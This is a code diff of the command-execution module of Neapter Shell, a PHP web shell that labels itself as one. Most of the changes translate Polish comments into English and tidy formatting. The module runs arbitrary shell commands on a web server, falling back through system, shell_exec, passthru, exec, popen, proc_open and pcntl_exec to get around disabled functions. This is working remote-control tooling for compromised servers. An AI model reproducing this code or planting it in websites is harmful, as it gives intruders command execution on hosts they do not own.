@@ -3,27 +3,32 @@
 /**
  * Neapter Shell
  *
+ * @category  WebShell
+ * @package   NeapterShell
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
+ * @copyright 2011-2016 Krzysztof Otręba
  *
- * @license   http://www.gnu.org/licenses/gpl-3.0.txt
+ * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
+ * @link    http://github.com/krzotr/neapter-shell
  */
 
 /**
- * Zmienianie uprawnien dla pliku
+ * Execute shell command using system, shell_exec, exec, passthru, popen,
+ * proc_open or pcntl_exec php function
  *
+ * @category  WebShell
+ * @package   NeapterShell
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
+ * @copyright 2011-2016 Krzysztof Otręba
  *
- * @package    NeapterShell
- * @subpackage Modules
+ * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
+ * @link    http://github.com/krzotr/neapter-shell
  */
 class ModuleSystem extends ModuleAbstract
 {
     /**
-     * Dostepna lista komend
+     * Get list of available commands
      *
-     * @access public
      * @return array
      */
     public static function getCommands()
@@ -35,9 +40,8 @@ class ModuleSystem extends ModuleAbstract
     }
 
     /**
-     * Zwracanie wersji modulu
+     * Get module version
      *
-     * @access public
      * @return string
      */
     public static function getVersion()
@@ -46,9 +50,8 @@ class ModuleSystem extends ModuleAbstract
     }
 
     /**
-     * Zwracanie pomocy modulu
+     * Get details module information
      *
-     * @access public
      * @return string
      */
     public static function getHelp()
@@ -64,11 +67,22 @@ system - Uruchomienie polecenia systemowego
 DATA;
     }
 
+    /**
+     * Does shell function is not blocked?
+     *
+     * @return bool
+     */
     protected function isFuncAvailable($sFunc)
     {
         return !in_array($sFunc, $this->oUtils->getDisabledFunctions());
     }
 
+
+    /**
+     * Execute shell command via pcntl_exec function
+     *
+     * @return string
+     */
     protected function getPcntl($sCmd)
     {
         echo "pcntl_exec():\r\n\r\n";
@@ -101,8 +115,9 @@ DATA;
 
                 $rStdOut = fopen($sTmpFile, 'w');
                 pcntl_exec($sFullPath, $aArgs);
+                break;
             default:
-               break;
+                break;
         }
 
         usleep(10000);
@@ -114,9 +129,8 @@ DATA;
     }
 
     /**
-     * Wywolanie modulu
+     * Execute shell command
      *
-     * @access public
      * @return string
      */
     public function get()
@@ -137,39 +151,20 @@ DATA;
 
         ob_start();
 
-        /**
-         * system
-         */
         if ($this->isFuncAvailable('system')) {
             echo "system():\r\n\r\n";
             system($sCmd);
-        }
-        /**
-         * shell_exec
-         */
-        else if ($this->isFuncAvailable('shell_exec')) {
+        } elseif ($this->isFuncAvailable('shell_exec')) {
             echo "shell_exec():\r\n\r\n";
             echo shell_exec($sCmd);
-        }
-        /**
-         * passthru
-         */
-        else if ($this->isFuncAvailable('passthru')) {
+        } elseif ($this->isFuncAvailable('passthru')) {
             echo "passthru():\r\n\r\n";
             passthru($sCmd);
-        }
-        /**
-         * exec
-         */
-        else if ($this->isFuncAvailable('exec')) {
+        } elseif ($this->isFuncAvailable('exec')) {
             echo "exec():\r\n\r\n";
             exec($sCmd, $aOutput);
             echo implode("\n", $aOutput) . "\n";
-        }
-        /**
-         * popen
-         */
-        else if ($this->isFuncAvailable('popen')) {
+        } elseif ($this->isFuncAvailable('popen')) {
             echo "popen():\r\n\r\n";
             $rFp = popen($sCmd, 'r');
 
@@ -178,13 +173,11 @@ DATA;
                     echo fread($rFp, 1024);
                 }
             }
-        }
-        /**
-         * proc_open
-         */
-        else if ($this->isFuncAvailable('proc_open')) {
+        } elseif ($this->isFuncAvailable('proc_open')) {
             echo "proc_open():\r\n\r\n";
-            $rFp = proc_open($sCmd, array(
+            $rFp = proc_open(
+                $sCmd,
+                array(
                     array('pipe', 'r'),
                     array('pipe', 'w')
                 ),
@@ -197,11 +190,7 @@ DATA;
                     usleep(10000);
                 }
             }
-        }
-        /**
-         * pcntl_exec
-         */
-        else if (function_exists('pcntl_exec')
+        } elseif (function_exists('pcntl_exec')
             && $this->isFuncAvailable('pcntl_exec')
         ) {
             $this->getPcntl($sCmd);
